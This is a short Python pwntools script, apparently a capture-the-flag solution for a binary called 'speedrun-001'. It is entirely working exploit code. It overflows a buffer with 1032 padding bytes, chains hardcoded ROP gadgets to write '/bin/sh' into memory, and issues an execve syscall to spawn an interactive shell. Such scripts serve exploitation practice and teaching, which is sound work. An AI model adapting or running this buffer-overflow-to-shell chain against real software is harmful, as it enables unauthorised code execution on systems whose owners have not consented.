#!/usr/bin/env python3
from pwn import *

# ROP gadgets
pop_rax = 0x415664        # pop rax; ret
pop_rsi = 0x4101f3        # pop rsi; ret
pop_rdi = 0x400686        # pop rdi; ret
pop_rdx = 0x4498b5        # pop rdx; ret
syscall_gadget = 0x40129c # syscall
mov_gadget = 0x48d251     # mov qword ptr [rax], rdx ; ret

data_region_addr = 0x6b90e0

target = process("./speedrun-001")
target.recvuntil(b"last words?")

# write /bin/sh in memory
payload = b""
payload += p64(pop_rax)
payload += p64(data_region_addr)
payload += p64(pop_rdx)
payload += b"/bin/sh\x00"
payload += p64(mov_gadget)

# do execve syscall
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(data_region_addr)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rdx)
payload += p64(0x0)

payload += p64(syscall_gadget)

payload = b"A" * 1032 + payload

target.sendline(payload)

target.interactive()
